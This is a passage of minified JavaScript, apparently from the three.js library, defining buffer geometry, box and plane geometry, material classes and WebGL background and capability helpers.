e,i=t.faces,n=t.vertices,r=t.faceVertexUvs,a=r[0]&&r[0].length>0,o=r[1]&&r[1].length>0,s=t.morphTargets,l=s.length;if(l>0){e=[];for(var c=0;c<l;c++)e[c]={name:s[c].name,data:[]};this.morphTargets.position=e}var h,u=t.morphNormals,d=u.length;if(d>0){for(h=[],c=0;c<d;c++)h[c]={name:u[c].name,data:[]};this.morphTargets.normal=h}var p=t.skinIndices,f=t.skinWeights,m=p.length===n.length,_=f.length===n.length;for(n.length>0&&i.length,c=0;c<i.length;c++){var g=i[c];this.vertices.push(n[g.a],n[g.b],n[g.c]);var v=g.vertexNormals;if(3===v.length)this.normals.push(v[0],v[1],v[2]);else{var y=g.normal;this.normals.push(y,y,y)}var x,b=g.vertexColors;if(3===b.length)this.colors.push(b[0],b[1],b[2]);else{var w=g.color;this.colors.push(w,w,w)}!0===a&&(void 0!==(x=r[0][c])?this.uvs.push(x[0],x[1],x[2]):this.uvs.push(new Jt,new Jt,new Jt)),!0===o&&(void 0!==(x=r[1][c])?this.uvs2.push(x[0],x[1],x[2]):this.uvs2.push(new Jt,new Jt,new Jt));for(var T=0;T<l;T++){var S=s[T].vertices;e[T].data.push(S[g.a],S[g.b],S[g.c])}for(T=0;T<d;T++){var M=u[T].vertexNormals[c];h[T].data.push(M.a,M.b,M.c)}m&&this.skinIndices.push(p[g.a],p[g.b],p[g.c]),_&&this.skinWeights.push(f[g.a],f[g.b],f[g.c])}return this.computeGroups(t),this.verticesNeedUpdate=t.verticesNeedUpdate,this.normalsNeedUpdate=t.normalsNeedUpdate,this.colorsNeedUpdate=t.colorsNeedUpdate,this.uvsNeedUpdate=t.uvsNeedUpdate,this.groupsNeedUpdate=t.groupsNeedUpdate,this}});var ei=1;function ii(){Object.defineProperty(this,"id",{value:ei+=2}),this.uuid=Zt.generateUUID(),this.name="",this.type="BufferGeometry",this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}function ni(t,e,i,n,r,a){je.call(this),this.type="BoxGeometry",this.parameters={width:t,height:e,depth:i,widthSegments:n,heightSegments:r,depthSegments:a},this.fromBufferGeometry(new ri(t,e,i,n,r,a)),this.mergeVertices()}function ri(t,e,i,n,r,a){ii.call(this),this.type="BoxBufferGeometry",this.parameters={width:t,height:e,depth:i,widthSegments:n,heightSegments:r,depthSegments:a};var o=this;t=t||1,e=e||1,i=i||1,n=Math.floor(n)||1,r=Math.floor(r)||1,a=Math.floor(a)||1;var s=[],l=[],c=[],h=[],u=0,d=0;function p(t,e,i,n,r,a,p,f,m,_,g){var v,y,x=a/m,b=p/_,w=a/2,T=p/2,S=f/2,M=m+1,E=_+1,L=0,k=0,A=new ee;for(y=0;y<E;y++){var P=y*b-T;for(v=0;v<M;v++){var O=v*x-w;A[t]=O*n,A[e]=P*r,A[i]=S,l.push(A.x,A.y,A.z),A[t]=0,A[e]=0,A[i]=f>0?1:-1,c.push(A.x,A.y,A.z),h.push(v/m),h.push(1-y/_),L+=1}}for(y=0;y<_;y++)for(v=0;v<m;v++){var C=u+v+M*y,R=u+v+M*(y+1),I=u+(v+1)+M*(y+1),F=u+(v+1)+M*y;s.push(C,R,F),s.push(R,I,F),k+=6}o.addGroup(d,k,g),d+=k,u+=L}p("z","y","x",-1,-1,i,e,t,a,r,0),p("z","y","x",1,-1,i,e,-t,a,r,1),p("x","z","y",1,1,t,i,e,n,a,2),p("x","z","y",1,-1,t,i,-e,n,a,3),p("x","y","z",1,-1,t,e,i,n,r,4),p("x","y","z",-1,-1,t,e,-i,n,r,5),this.setIndex(s),this.addAttribute("position",new Ke(l,3)),this.addAttribute("normal",new Ke(c,3)),this.addAttribute("uv",new Ke(h,2))}function ai(t,e,i,n){je.call(this),this.type="PlaneGeometry",this.parameters={width:t,height:e,widthSegments:i,heightSegments:n},this.fromBufferGeometry(new oi(t,e,i,n)),this.mergeVertices()}function oi(t,e,i,n){ii.call(this),this.type="PlaneBufferGeometry",this.parameters={width:t,height:e,widthSegments:i,heightSegments:n};var r,a,o=(t=t||1)/2,s=(e=e||1)/2,l=Math.floor(i)||1,c=Math.floor(n)||1,h=l+1,u=c+1,d=t/l,p=e/c,f=[],m=[],_=[],g=[];for(a=0;a<u;a++){var v=a*p-s;for(r=0;r<h;r++){var y=r*d-o;m.push(y,-v,0),_.push(0,0,1),g.push(r/l),g.push(1-a/c)}}for(a=0;a<c;a++)for(r=0;r<l;r++){var x=r+h*a,b=r+h*(a+1),w=r+1+h*(a+1),T=r+1+h*a;f.push(x,b,T),f.push(b,w,T)}this.setIndex(f),this.addAttribute("position",new Ke(m,3)),this.addAttribute("normal",new Ke(_,3)),this.addAttribute("uv",new Ke(g,2))}ii.prototype=Object.assign(Object.create(Kt.prototype),{constructor:ii,isBufferGeometry:!0,getIndex:function(){return this.index},setIndex:function(t){Array.isArray(t)?this.index=new(ti(t)>65535?Ze:$e)(t,1):this.index=t},addAttribute:function(t,e){return e&&e.isBufferAttribute||e&&e.isInterleavedBufferAttribute?"index"===t?(this.setIndex(e),this):(this.attributes[t]=e,this):this.addAttribute(t,new We(arguments[1],arguments[2]))},getAttribute:function(t){return this.attributes[t]},removeAttribute:function(t){return delete this.attributes[t],this},addGroup:function(t,e,i){this.groups.push({start:t,count:e,materialIndex:void 0!==i?i:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(t,e){this.drawRange.start=t,this.drawRange.count=e},applyMatrix:function(t){var e=this.attributes.position;void 0!==e&&(t.applyToBufferAttribute(e),e.needsUpdate=!0);var i=this.attributes.normal;void 0!==i&&((new ie).getNormalMatrix(t).applyToBufferAttribute(i),i.needsUpdate=!0);var n=this.attributes.tangent;return void 0!==n&&((new ie).getNormalMatrix(t).applyToBufferAttribute(n),n.needsUpdate=!0),null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this},rotateX:function(){var t=new Qt;return function(e){return t.makeRotationX(e),this.applyMatrix(t),this}}(),rotateY:function(){var t=new Qt;return function(e){return t.makeRotationY(e),this.applyMatrix(t),this}}(),rotateZ:function(){var t=new Qt;return function(e){return t.makeRotationZ(e),this.applyMatrix(t),this}}(),translate:function(){var t=new Qt;return function(e,i,n){return t.makeTranslation(e,i,n),this.applyMatrix(t),this}}(),scale:function(){var t=new Qt;return function(e,i,n){return t.makeScale(e,i,n),this.applyMatrix(t),this}}(),lookAt:function(){var t=new De;return function(e){t.lookAt(e),t.updateMatrix(),this.applyMatrix(t.matrix)}}(),center:function(){var t=new ee;return function(){return this.computeBoundingBox(),this.boundingBox.getCenter(t).negate(),this.translate(t.x,t.y,t.z),this}}(),setFromObject:function(t){var e=t.geometry;if(t.isPoints||t.isLine){var i=new Ke(3*e.vertices.length,3),n=new Ke(3*e.colors.length,3);if(this.addAttribute("position",i.copyVector3sArray(e.vertices)),this.addAttribute("color",n.copyColorsArray(e.colors)),e.lineDistances&&e.lineDistances.length===e.vertices.length){var r=new Ke(e.lineDistances.length,1);this.addAttribute("lineDistance",r.copyArray(e.lineDistances))}null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone())}else t.isMesh&&e&&e.isGeometry&&this.fromGeometry(e);return this},setFromPoints:function(t){for(var e=[],i=0,n=t.length;i<n;i++){var r=t[i];e.push(r.x,r.y,r.z||0)}return this.addAttribute("position",new Ke(e,3)),this},updateFromObject:function(t){var e,i=t.geometry;if(t.isMesh){var n=i.__directGeometry;if(!0===i.elementsNeedUpdate&&(n=void 0,i.elementsNeedUpdate=!1),void 0===n)return this.fromGeometry(i);n.verticesNeedUpdate=i.verticesNeedUpdate,n.normalsNeedUpdate=i.normalsNeedUpdate,n.colorsNeedUpdate=i.colorsNeedUpdate,n.uvsNeedUpdate=i.uvsNeedUpdate,n.groupsNeedUpdate=i.groupsNeedUpdate,i.verticesNeedUpdate=!1,i.normalsNeedUpdate=!1,i.colorsNeedUpdate=!1,i.uvsNeedUpdate=!1,i.groupsNeedUpdate=!1,i=n}return!0===i.verticesNeedUpdate&&(void 0!==(e=this.attributes.position)&&(e.copyVector3sArray(i.vertices),e.needsUpdate=!0),i.verticesNeedUpdate=!1),!0===i.normalsNeedUpdate&&(void 0!==(e=this.attributes.normal)&&(e.copyVector3sArray(i.normals),e.needsUpdate=!0),i.normalsNeedUpdate=!1),!0===i.colorsNeedUpdate&&(void 0!==(e=this.attributes.color)&&(e.copyColorsArray(i.colors),e.needsUpdate=!0),i.colorsNeedUpdate=!1),i.uvsNeedUpdate&&(void 0!==(e=this.attributes.uv)&&(e.copyVector2sArray(i.uvs),e.needsUpdate=!0),i.uvsNeedUpdate=!1),i.lineDistancesNeedUpdate&&(void 0!==(e=this.attributes.lineDistance)&&(e.copyArray(i.lineDistances),e.needsUpdate=!0),i.lineDistancesNeedUpdate=!1),i.groupsNeedUpdate&&(i.computeGroups(t.geometry),this.groups=i.groups,i.groupsNeedUpdate=!1),this},fromGeometry:function(t){return t.__directGeometry=(new Qe).fromGeometry(t),this.fromDirectGeometry(t.__directGeometry)},fromDirectGeometry:function(t){var e=new Float32Array(3*t.vertices.length);if(this.addAttribute("position",new We(e,3).copyVector3sArray(t.vertices)),t.normals.length>0){var i=new Float32Array(3*t.normals.length);this.addAttribute("normal",new We(i,3).copyVector3sArray(t.normals))}if(t.colors.length>0){var n=new Float32Array(3*t.colors.length);this.addAttribute("color",new We(n,3).copyColorsArray(t.colors))}if(t.uvs.length>0){var r=new Float32Array(2*t.uvs.length);this.addAttribute("uv",new We(r,2).copyVector2sArray(t.uvs))}if(t.uvs2.length>0){var a=new Float32Array(2*t.uvs2.length);this.addAttribute("uv2",new We(a,2).copyVector2sArray(t.uvs2))}for(var o in this.groups=t.groups,t.morphTargets){for(var s=[],l=t.morphTargets[o],c=0,h=l.length;c<h;c++){var u=l[c],d=new Ke(3*u.data.length,3);d.name=u.name,s.push(d.copyVector3sArray(u.data))}this.morphAttributes[o]=s}if(t.skinIndices.length>0){var p=new Ke(4*t.skinIndices.length,4);this.addAttribute("skinIndex",p.copyVector4sArray(t.skinIndices))}if(t.skinWeights.length>0){var f=new Ke(4*t.skinWeights.length,4);this.addAttribute("skinWeight",f.copyVector4sArray(t.skinWeights))}return null!==t.boundingSphere&&(this.boundingSphere=t.boundingSphere.clone()),null!==t.boundingBox&&(this.boundingBox=t.boundingBox.clone()),this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new de);var t=this.attributes.position;void 0!==t?this.boundingBox.setFromBufferAttribute(t):this.boundingBox.makeEmpty(),isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z)},computeBoundingSphere:function(){var t=new de,e=new ee;return function(){null===this.boundingSphere&&(this.boundingSphere=new pe);var i=this.attributes.position;if(i){var n=this.boundingSphere.center;t.setFromBufferAttribute(i),t.getCenter(n);for(var r=0,a=0,o=i.count;a<o;a++)e.x=i.getX(a),e.y=i.getY(a),e.z=i.getZ(a),r=Math.max(r,n.distanceToSquared(e));this.boundingSphere.radius=Math.sqrt(r),isNaN(this.boundingSphere.radius)}}}(),computeFaceNormals:function(){},computeVertexNormals:function(){var t=this.index,e=this.attributes;if(e.position){var i=e.position.array;if(void 0===e.normal)this.addAttribute("normal",new We(new Float32Array(i.length),3));else for(var n=e.normal.array,r=0,a=n.length;r<a;r++)n[r]=0;var o,s,l,c=e.normal.array,h=new ee,u=new ee,d=new ee,p=new ee,f=new ee;if(t){var m=t.array;for(r=0,a=t.count;r<a;r+=3)o=3*m[r+0],s=3*m[r+1],l=3*m[r+2],h.fromArray(i,o),u.fromArray(i,s),d.fromArray(i,l),p.subVectors(d,u),f.subVectors(h,u),p.cross(f),c[o]+=p.x,c[o+1]+=p.y,c[o+2]+=p.z,c[s]+=p.x,c[s+1]+=p.y,c[s+2]+=p.z,c[l]+=p.x,c[l+1]+=p.y,c[l+2]+=p.z}else for(r=0,a=i.length;r<a;r+=9)h.fromArray(i,r),u.fromArray(i,r+3),d.fromArray(i,r+6),p.subVectors(d,u),f.subVectors(h,u),p.cross(f),c[r]=p.x,c[r+1]=p.y,c[r+2]=p.z,c[r+3]=p.x,c[r+4]=p.y,c[r+5]=p.z,c[r+6]=p.x,c[r+7]=p.y,c[r+8]=p.z;this.normalizeNormals(),e.normal.needsUpdate=!0}},merge:function(t,e){if(t&&t.isBufferGeometry){void 0===e&&(e=0);var i=this.attributes;for(var n in i)if(void 0!==t.attributes[n])for(var r=i[n].array,a=t.attributes[n],o=a.array,s=0,l=a.itemSize*e;s<o.length;s++,l++)r[l]=o[s];return this}},normalizeNormals:function(){var t=new ee;return function(){for(var e=this.attributes.normal,i=0,n=e.count;i<n;i++)t.x=e.getX(i),t.y=e.getY(i),t.z=e.getZ(i),t.normalize(),e.setXYZ(i,t.x,t.y,t.z)}}(),toNonIndexed:function(){function t(t,e){for(var i=t.array,n=t.itemSize,r=new i.constructor(e.length*n),a=0,o=0,s=0,l=e.length;s<l;s++){a=e[s]*n;for(var c=0;c<n;c++)r[o++]=i[a++]}return new We(r,n)}if(null===this.index)return this;var e=new ii,i=this.index.array,n=this.attributes;for(var r in n){var a=t(n[r],i);e.addAttribute(r,a)}var o=this.morphAttributes;for(r in o){for(var s=[],l=o[r],c=0,h=l.length;c<h;c++)a=t(l[c],i),s.push(a);e.morphAttributes[r]=s}for(var u=this.groups,d=(c=0,u.length);c<d;c++){var p=u[c];e.addGroup(p.start,p.count,p.materialIndex)}return e},toJSON:function(){var t={metadata:{version:4.5,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(t.uuid=this.uuid,t.type=this.type,""!==this.name&&(t.name=this.name),Object.keys(this.userData).length>0&&(t.userData=this.userData),void 0!==this.parameters){var e=this.parameters;for(var i in e)void 0!==e[i]&&(t[i]=e[i]);return t}t.data={attributes:{}};var n=this.index;null!==n&&(t.data.index={type:n.array.constructor.name,array:Array.prototype.slice.call(n.array)});var r=this.attributes;for(var i in r){var a={itemSize:(d=r[i]).itemSize,type:d.array.constructor.name,array:Array.prototype.slice.call(d.array),normalized:d.normalized};""!==d.name&&(a.name=d.name),t.data.attributes[i]=a}var o={},s=!1;for(var i in this.morphAttributes){for(var l=this.morphAttributes[i],c=[],h=0,u=l.length;h<u;h++){var d;a={itemSize:(d=l[h]).itemSize,type:d.array.constructor.name,array:Array.prototype.slice.call(d.array),normalized:d.normalized},""!==d.name&&(a.name=d.name),c.push(a)}c.length>0&&(o[i]=c,s=!0)}s&&(t.data.morphAttributes=o);var p=this.groups;p.length>0&&(t.data.groups=JSON.parse(JSON.stringify(p)));var f=this.boundingSphere;return null!==f&&(t.data.boundingSphere={center:f.center.toArray(),radius:f.radius}),t},clone:function(){return(new ii).copy(this)},copy:function(t){var e,i,n;this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.name=t.name;var r=t.index;null!==r&&this.setIndex(r.clone());var a=t.attributes;for(e in a){var o=a[e];this.addAttribute(e,o.clone())}var s=t.morphAttributes;for(e in s){var l=[],c=s[e];for(i=0,n=c.length;i<n;i++)l.push(c[i].clone());this.morphAttributes[e]=l}var h=t.groups;for(i=0,n=h.length;i<n;i++){var u=h[i];this.addGroup(u.start,u.count,u.materialIndex)}var d=t.boundingBox;null!==d&&(this.boundingBox=d.clone());var p=t.boundingSphere;return null!==p&&(this.boundingSphere=p.clone()),this.drawRange.start=t.drawRange.start,this.drawRange.count=t.drawRange.count,this.userData=t.userData,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),ni.prototype=Object.create(je.prototype),ni.prototype.constructor=ni,ri.prototype=Object.create(ii.prototype),ri.prototype.constructor=ri,ai.prototype=Object.create(je.prototype),ai.prototype.constructor=ai,oi.prototype=Object.create(ii.prototype),oi.prototype.constructor=oi;var si=0;function li(){Object.defineProperty(this,"id",{value:si++}),this.uuid=Zt.generateUUID(),this.name="",this.type="Material",this.fog=!0,this.lights=!0,this.blending=1,this.side=0,this.flatShading=!1,this.vertexTangents=!1,this.vertexColors=0,this.opacity=1,this.transparent=!1,this.blendSrc=204,this.blendDst=205,this.blendEquation=Et,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.depthFunc=3,this.depthTest=!0,this.depthWrite=!0,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaTest=0,this.premultipliedAlpha=!1,this.visible=!0,this.userData={},this.needsUpdate=!0}li.prototype=Object.assign(Object.create(Kt.prototype),{constructor:li,isMaterial:!0,onBeforeCompile:function(){},setValues:function(t){if(void 0!==t)for(var e in t){var i=t[e];if(void 0!==i)if("shading"!==e){var n=this[e];void 0!==n&&(n&&n.isColor?n.set(i):n&&n.isVector3&&i&&i.isVector3?n.copy(i):this[e]=i)}else this.flatShading=1===i}},toJSON:function(t){var e=void 0===t||"string"==typeof t;e&&(t={textures:{},images:{}});var i={metadata:{version:4.5,type:"Material",generator:"Material.toJSON"}};function n(t){var e=[];for(var i in t){var n=t[i];delete n.metadata,e.push(n)}return e}if(i.uuid=this.uuid,i.type=this.type,""!==this.name&&(i.name=this.name),this.color&&this.color.isColor&&(i.color=this.color.getHex()),void 0!==this.roughness&&(i.roughness=this.roughness),void 0!==this.metalness&&(i.metalness=this.metalness),this.emissive&&this.emissive.isColor&&(i.emissive=this.emissive.getHex()),1!==this.emissiveIntensity&&(i.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(i.specular=this.specular.getHex()),void 0!==this.shininess&&(i.shininess=this.shininess),void 0!==this.clearCoat&&(i.clearCoat=this.clearCoat),void 0!==this.clearCoatRoughness&&(i.clearCoatRoughness=this.clearCoatRoughness),this.map&&this.map.isTexture&&(i.map=this.map.toJSON(t).uuid),this.alphaMap&&this.alphaMap.isTexture&&(i.alphaMap=this.alphaMap.toJSON(t).uuid),this.lightMap&&this.lightMap.isTexture&&(i.lightMap=this.lightMap.toJSON(t).uuid),this.aoMap&&this.aoMap.isTexture&&(i.aoMap=this.aoMap.toJSON(t).uuid,i.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(i.bumpMap=this.bumpMap.toJSON(t).uuid,i.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(i.normalMap=this.normalMap.toJSON(t).uuid,i.normalMapType=this.normalMapType,i.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(i.displacementMap=this.displacementMap.toJSON(t).uuid,i.displacementScale=this.displacementScale,i.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(i.roughnessMap=this.roughnessMap.toJSON(t).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(i.metalnessMap=this.metalnessMap.toJSON(t).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(i.emissiveMap=this.emissiveMap.toJSON(t).uuid),this.specularMap&&this.specularMap.isTexture&&(i.specularMap=this.specularMap.toJSON(t).uuid),this.envMap&&this.envMap.isTexture&&(i.envMap=this.envMap.toJSON(t).uuid,i.reflectivity=this.reflectivity,void 0!==this.combine&&(i.combine=this.combine),void 0!==this.envMapIntensity&&(i.envMapIntensity=this.envMapIntensity)),this.gradientMap&&this.gradientMap.isTexture&&(i.gradientMap=this.gradientMap.toJSON(t).uuid),void 0!==this.size&&(i.size=this.size),void 0!==this.sizeAttenuation&&(i.sizeAttenuation=this.sizeAttenuation),1!==this.blending&&(i.blending=this.blending),!0===this.flatShading&&(i.flatShading=this.flatShading),0!==this.side&&(i.side=this.side),0!==this.vertexColors&&(i.vertexColors=this.vertexColors),this.opacity<1&&(i.opacity=this.opacity),!0===this.transparent&&(i.transparent=this.transparent),i.depthFunc=this.depthFunc,i.depthTest=this.depthTest,i.depthWrite=this.depthWrite,0!==this.rotation&&(i.rotation=this.rotation),!0===this.polygonOffset&&(i.polygonOffset=!0),0!==this.polygonOffsetFactor&&(i.polygonOffsetFactor=this.polygonOffsetFactor),0!==this.polygonOffsetUnits&&(i.polygonOffsetUnits=this.polygonOffsetUnits),1!==this.linewidth&&(i.linewidth=this.linewidth),void 0!==this.dashSize&&(i.dashSize=this.dashSize),void 0!==this.gapSize&&(i.gapSize=this.gapSize),void 0!==this.scale&&(i.scale=this.scale),!0===this.dithering&&(i.dithering=!0),this.alphaTest>0&&(i.alphaTest=this.alphaTest),!0===this.premultipliedAlpha&&(i.premultipliedAlpha=this.premultipliedAlpha),!0===this.wireframe&&(i.wireframe=this.wireframe),this.wireframeLinewidth>1&&(i.wireframeLinewidth=this.wireframeLinewidth),"round"!==this.wireframeLinecap&&(i.wireframeLinecap=this.wireframeLinecap),"round"!==this.wireframeLinejoin&&(i.wireframeLinejoin=this.wireframeLinejoin),!0===this.morphTargets&&(i.morphTargets=!0),!0===this.skinning&&(i.skinning=!0),!1===this.visible&&(i.visible=!1),"{}"!==JSON.stringify(this.userData)&&(i.userData=this.userData),e){var r=n(t.textures),a=n(t.images);r.length>0&&(i.textures=r),a.length>0&&(i.images=a)}return i},clone:function(){return(new this.constructor).copy(this)},copy:function(t){this.name=t.name,this.fog=t.fog,this.lights=t.lights,this.blending=t.blending,this.side=t.side,this.flatShading=t.flatShading,this.vertexColors=t.vertexColors,this.opacity=t.opacity,this.transparent=t.transparent,this.blendSrc=t.blendSrc,this.blendDst=t.blendDst,this.blendEquation=t.blendEquation,this.blendSrcAlpha=t.blendSrcAlpha,this.blendDstAlpha=t.blendDstAlpha,this.blendEquationAlpha=t.blendEquationAlpha,this.depthFunc=t.depthFunc,this.depthTest=t.depthTest,this.depthWrite=t.depthWrite,this.colorWrite=t.colorWrite,this.precision=t.precision,this.polygonOffset=t.polygonOffset,this.polygonOffsetFactor=t.polygonOffsetFactor,this.polygonOffsetUnits=t.polygonOffsetUnits,this.dithering=t.dithering,this.alphaTest=t.alphaTest,this.premultipliedAlpha=t.premultipliedAlpha,this.visible=t.visible,this.userData=JSON.parse(JSON.stringify(t.userData)),this.clipShadows=t.clipShadows,this.clipIntersection=t.clipIntersection;var e=t.clippingPlanes,i=null;if(null!==e){var n=e.length;i=new Array(n);for(var r=0;r!==n;++r)i[r]=e[r].clone()}return this.clippingPlanes=i,this.shadowSide=t.shadowSide,this},dispose:function(){this.dispatchEvent({type:"dispose"})}});var ci,hi,ui,di,pi,fi,mi,_i,gi,vi,yi,xi;function bi(t){li.call(this),this.type="ShaderMaterial",this.defines={},this.uniforms={},this.vertexShader="\nvoid main() {\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}\n",this.fragmentShader="\nvoid main() {\n\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\n}\n",this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,void 0!==t&&(t.attributes,this.setValues(t))}function wi(t,e){this.origin=void 0!==t?t:new ee,this.direction=void 0!==e?e:new ee}function Ti(t,e,i){this.a=void 0!==t?t:new ee,this.b=void 0!==e?e:new ee,this.c=void 0!==i?i:new ee}function Si(t){li.call(this),this.type="MeshBasicMaterial",this.color=new be(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.lights=!1,this.setValues(t)}function Mi(t,e){De.call(this),this.type="Mesh",this.geometry=void 0!==t?t:new ii,this.material=void 0!==e?e:new Si({color:16777215*Math.random()}),this.drawMode=0,this.updateMorphTargets()}function Ei(t,e,i,n){var r,a,o=new be(0),s=0,l=null,c=0;function h(t,i){e.buffers.color.setClear(t.r,t.g,t.b,i,n)}return{getClearColor:function(){return o},setClearColor:function(t,e){o.set(t),h(o,s=void 0!==e?e:1)},getClearAlpha:function(){return s},setClearAlpha:function(t){h(o,s=t)},render:function(e,n,u,d){var p=n.background;if(null===p?(h(o,s),l=null,c=0):p&&p.isColor&&(h(p,1),d=!0,l=null,c=0),(t.autoClear||d)&&t.clear(t.autoClearColor,t.autoClearDepth,t.autoClearStencil),p&&(p.isCubeTexture||p.isWebGLRenderTargetCube)){void 0===a&&((a=new Mi(new ri(1,1,1),new bi({type:"BackgroundCubeMaterial",uniforms:Te(Le.cube.uniforms),vertexShader:Le.cube.vertexShader,fragmentShader:Le.cube.fragmentShader,side:1,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.removeAttribute("normal"),a.geometry.removeAttribute("uv"),a.onBeforeRender=function(t,e,i){this.matrixWorld.copyPosition(i.matrixWorld)},Object.defineProperty(a.material,"map",{get:function(){return this.uniforms.tCube.value}}),i.update(a));var f=p.isWebGLRenderTargetCube?p.texture:p;a.material.uniforms.tCube.value=f,a.material.uniforms.tFlip.value=p.isWebGLRenderTargetCube?1:-1,l===p&&c===f.version||(a.material.needsUpdate=!0,l=p,c=f.version),e.unshift(a,a.geometry,a.material,0,0,null)}else p&&p.isTexture&&(void 0===r&&((r=new Mi(new oi(2,2),new bi({type:"BackgroundMaterial",uniforms:Te(Le.background.uniforms),vertexShader:Le.background.vertexShader,fragmentShader:Le.background.fragmentShader,side:0,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.removeAttribute("normal"),Object.defineProperty(r.material,"map",{get:function(){return this.uniforms.t2D.value}}),i.update(r)),r.material.uniforms.t2D.value=p,!0===p.matrixAutoUpdate&&p.updateMatrix(),r.material.uniforms.uvTransform.value.copy(p.matrix),l===p&&c===p.version||(r.material.needsUpdate=!0,l=p,c=p.version),e.unshift(r,r.geometry,r.material,0,0,null))}}}function Li(t,e,i,n){var r;this.setMode=function(t){r=t},this.render=function(e,n){t.drawArrays(r,e,n),i.update(n,r)},this.renderInstances=function(a,o,s){var l;if(n.isWebGL2)l=t;else if(null===(l=e.get("ANGLE_instanced_arrays")))return;l[n.isWebGL2?"drawArraysInstanced":"drawArraysInstancedANGLE"](r,o,s,a.maxInstancedCount),i.update(s,r,a.maxInstancedCount)}}function ki(t,e,i){var n;function r(e){if("highp"===e){if(t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.HIGH_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.HIGH_FLOAT).precision>0)return"highp";e="mediump"}return"mediump"===e&&t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.MEDIUM_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.MEDIUM_FLOAT).precision>0?"mediump":"lowp"}var a="undefined"!=typeof WebGL2RenderingContext&&t instanceof WebGL2RenderingContext,o=void 0!==i.precision?i.precision:"highp",s=r(o);s!==o&&(o=s);var l=!0===i.logarithmicDepthBuffer,c=t.getParameter(t.MAX_TEXTURE_IMAGE_UNITS),h=t.getParameter(t.MAX_VERTEX_TEXTURE_IMAGE_UNITS),u=t.getParameter(t.MAX_TEXTURE_SIZE),d=t.getParameter(t.MAX_CUBE_MAP_TEXTURE_SIZE),p=t.getParameter(t.MAX_VERTEX_ATTRIBS),f=t.getParameter(t.MAX_VERTEX_UNIFORM_VECTORS),m=t.getParameter(t.MAX_VARYING_VECTORS),_=t.getParameter(t.MAX_FRAGMENT_UNIFORM_VECTORS),g=h>0,v=a||!!e.get("OES_texture_float");return{isWebGL2:a,getMaxAnisotropy:function(){if(void 0!==n)return n;var i=e.get("EXT_texture_filter_anisotropic");return n=null!==i?t.getParameter(i.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0},getMaxPrecision:r,precision:o,logarithmicDepthBuffer:l,maxTextures:c,maxVertexTextures:h,maxTextureSize:u,maxCubemapSize:d,maxAttributes:p,maxVertexUniforms:f,maxVaryings:m,maxFragmentUniforms:_,vertexTextures:g,floatFragmentTextures:v,floatVertexTextures:g&&v,maxSamples:a?t.getParameter(t.MAX_SAMPLES):0}}function Ai(t){var e={};return{get:function(i){if(void 0!==e[i])return e[i];var n;switch(i){case"WEBGL_depth_texture":n=t.getExtension("WEBGL_depth_texture")||t.getExtension("MOZ_WEBGL_depth_texture")||t.getExtension("WEBKIT_WEBGL_depth_texture");break;case"EXT_texture_filter_anisotropic":n=t.getExtension("EXT_texture_filter_anisotropic")||t.getExtension("MOZ_EXT_texture_filter_anisotropic")||t.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":n=t.getExtension("WEBGL_compressed_texture_s3tc")||t.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||t.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":n=t.getExtension("WEBGL_compressed_texture_pvrtc")||t.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:n=t.getExtension(i)}return e[i]=n,n}}}function Pi(t,e,i){var n={},r={};function a(t){var o=t.target,s=n[o.id];for(var l in null!==s.index&&e.remove(s.index),s.attributes)e.remove(s.attributes[l]);o.removeEventListener("dispose",a),delete n[o.id];var c=r[s.id];c&&(e.remove(c),delete r[s.id]),i.memory.geometries--}return{get:function(t,e){var 